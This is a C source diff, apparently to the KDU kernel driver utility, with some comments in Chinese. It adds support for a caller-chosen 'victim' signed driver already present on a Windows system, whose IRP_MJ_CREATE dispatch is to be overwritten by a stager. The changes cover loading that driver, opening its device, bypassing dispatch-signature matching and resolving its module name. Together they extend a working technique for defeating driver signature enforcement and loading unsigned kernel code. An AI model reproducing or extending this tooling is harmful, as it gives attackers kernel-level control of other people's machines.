@@ -20,6 +20,41 @@
 #include "global.h"
 
 /*
+* VpSetCustomVictim
+*
+* Purpose:
+*
+* Provide the image path and device name for the caller supplied victim
+* (KDU_VICTIM_CUSTOM). The database is not consulted for this victim, so the
+* caller can use any signed driver already present on the machine - typically one
+* picked by victim-scout, whose IRP_MJ_CREATE dispatch still has >= 0x800 bytes of
+* room for the stager.
+*
+*/
+static WCHAR g_CustomVictimPath[MAX_PATH * 2];
+static WCHAR g_CustomVictimDevice[MAX_PATH];
+
+VOID VpSetCustomVictim(
+    _In_opt_ LPCWSTR ImagePath,
+    _In_opt_ LPCWSTR DeviceName
+)
+{
+    if (ImagePath && ImagePath[0]) {
+        StringCchCopyW(g_CustomVictimPath, RTL_NUMBER_OF(g_CustomVictimPath), ImagePath);
+    }
+    else {
+        g_CustomVictimPath[0] = 0;
+    }
+
+    if (DeviceName && DeviceName[0]) {
+        StringCchCopyW(g_CustomVictimDevice, RTL_NUMBER_OF(g_CustomVictimDevice), DeviceName);
+    }
+    else {
+        g_CustomVictimDevice[0] = 0;
+    }
+}
+
+/*
 * VpCreate
 *
 * Purpose:
@@ -227,6 +262,41 @@ BOOL VpCreateCallback(
                 }
             }
 
+            /*
+             * 自定义 victim：不查数据库、不解密资源，直接用调用方给出的镜像路径。
+             * 签名驱动本来就在系统里，不需要再写文件。
+             */
+            if (ResourceId == KDU_VICTIM_RESOURCE_CUSTOM) {
+
+                if (g_CustomVictimPath[0] == 0 || !RtlDoesFileExists_U(g_CustomVictimPath)) {
+
+                    supPrintfEvent(kduEventError,
+                        "[!] Custom victim image is missing, abort\r\n");
+
+                    SetLastError(ERROR_FILE_NOT_FOUND);
+                    break;
+                }
+
+                printf_s("[+] Using caller supplied victim \"%ws\"\r\n", g_CustomVictimPath);
+
+                ntStatus = VppLoadUnloadDriver(Name,
+                    g_CustomVictimPath,
+                    TRUE,
+                    FALSE,
+                    Callback,
+                    CallbackParam);
+
+                if (NT_SUCCESS(ntStatus)) {
+                    SetLastError(ERROR_SUCCESS);
+                    bResult = TRUE;
+                }
+                else {
+                    SetLastError(RtlNtStatusToDosError(ntStatus));
+                }
+
+                break;
+            }
+
             drvBuffer = (PBYTE)KDULoadResource(ResourceId,
                 ModuleBase,
                 &resourceSize,
@@ -364,7 +434,10 @@ VOID VpExecuteCallback(
     _Out_ PHANDLE VictimHandle
 )
 {
-    supOpenDriver(Name, DesiredAccess, VictimHandle);
+    /* 自定义 victim 的驱动名与设备名可能不同，优先使用显式设备名。 */
+    LPCWSTR deviceName = (g_CustomVictimDevice[0] != 0) ? g_CustomVictimDevice : Name;
+
+    supOpenDriver(deviceName, DesiredAccess, VictimHandle);
 }
 
 /*
@@ -610,6 +683,16 @@ BOOL VpQueryInformation(
             dispatchSignature = Context->Data.DispatchSignature;
             signatureSize = Context->Data.DispatchSignatureLength;
 
+            /*
+             * 自定义 victim 没有签名可匹配：派发 RVA 由调用方通过
+             * Context->ArbitraryData 显式给出，这里只返回成功。
+             */
+            if (dispatchSignature == NULL || signatureSize == 0) {
+
+                RtlSecureZeroMemory(imageInfo, sizeof(*imageInfo));
+                break;
+            }
+
             sectionBase = ntsupLookupImageSectionByName((CHAR*)TEXT_SECTION,
                 TEXT_SECTION_LENGTH,
                 (PVOID)Context->Data.VictimImage,
@@ -680,7 +763,28 @@ BOOL VpQueryInformation(
 
                 WCHAR szTargetDriver[MAX_PATH];
 
-                StringCchPrintf(szTargetDriver, MAX_PATH, L"%ws.sys", Context->Name);
+                /*
+                 * 自定义 victim 的服务名与镜像名不同，模块列表里用的是镜像文件名
+                 * （例如 ufx01000.sys），所以这里要按自定义路径取基名。
+                 */
+                LPCWSTR lookupName = Context->Name;
+
+                if (Context->ResourceId == KDU_VICTIM_RESOURCE_CUSTOM && g_CustomVictimPath[0]) {
+
+                    static WCHAR customModuleName[MAX_PATH];
+
+                    LPCWSTR fileName = wcsrchr(g_CustomVictimPath, L'\\');
+                    fileName = (fileName != NULL) ? fileName + 1 : g_CustomVictimPath;
+
+                    StringCchCopyW(customModuleName, RTL_NUMBER_OF(customModuleName), fileName);
+
+                    LPWSTR extension = wcsrchr(customModuleName, L'.');
+                    if (extension) *extension = 0;
+
+                    lookupName = customModuleName;
+                }
+
+                StringCchPrintf(szTargetDriver, MAX_PATH, L"%ws.sys", lookupName);
                 RtlInitUnicodeString(&driverNameUs, szTargetDriver);
 
                 driverNameAs.Buffer = NULL;
